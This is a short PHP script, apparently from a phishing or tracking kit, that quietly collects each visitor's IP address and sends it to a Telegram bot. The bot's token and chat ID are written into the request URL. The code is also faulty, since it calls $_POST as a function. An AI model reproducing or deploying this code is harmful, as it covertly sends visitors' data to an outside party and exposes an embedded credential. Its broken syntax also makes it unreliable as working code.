<?php
    $ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
    $text2= $_POST("CLIENT IP IS: $ip");
        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text2");    
    
?>
